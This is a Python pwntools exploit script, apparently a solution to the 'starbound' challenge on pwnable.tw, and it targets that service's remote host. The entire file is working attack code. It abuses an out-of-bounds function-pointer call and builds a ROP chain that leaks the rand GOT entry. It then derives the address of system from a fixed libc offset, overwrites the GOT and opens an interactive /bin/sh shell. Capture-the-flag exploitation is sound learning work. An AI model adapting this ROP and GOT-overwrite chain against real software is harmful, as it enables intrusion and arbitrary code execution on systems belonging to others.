#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

c = 0
pwn_file = "./starbound"
elf = ELF(pwn_file)
rop = ROP(elf)

context.os='linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0
if debug == 1:
    c = process(pwn_file, env={'LD_LIBRARY_PATH': './'})
    gdbcmd = '''
    #b *0x804a65d
    #b *0x804a673
    c
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'
else:
    context.log_level ='debug'
    c = remote('chall.pwnable.tw', 10202)

def set_name(name):
    c.sendafter('>', '6\0')
    c.sendafter('>', '2\0')
    c.sendafter('name:', name)

def call_name(index):
    c.sendafter('> ', str(index - 8 - 100 // 4))


leave_addr = 0x804a673
pop_leave_addr = 0x0804a671
pop7_ret = 0x08048e48 # add esp, 0x1c ; ret # 7 * 4 = 28 = 1c
read_again = 0x804a62d
set_name(flat({0: p32(read_again), 4: p32(pop7_ret), 8: '/bin/sh\0'}, length=100))


call_name(0)
rop.write(1, elf.got['rand'], 0x30)
rop.read(0, elf.got['rand'], 0x20)
rop.raw(p32(elf.plt['rand']) + b'rett' + p32(0x80580d0 + 8)) #'/bin/sh'
print(rop.dump())

c.send(flat({0: '1\0', 0x4: rop.chain()}))
call_name(1)

# leak libc and hijack to system
gots = c.recvn(0x30)
rand_addr = u32(gots[0:4])

print(hex(rand_addr))
print(gots)

system_addr = rand_addr + 0xb4a0
c.send(p32(system_addr))


c.interactive()
c.close()
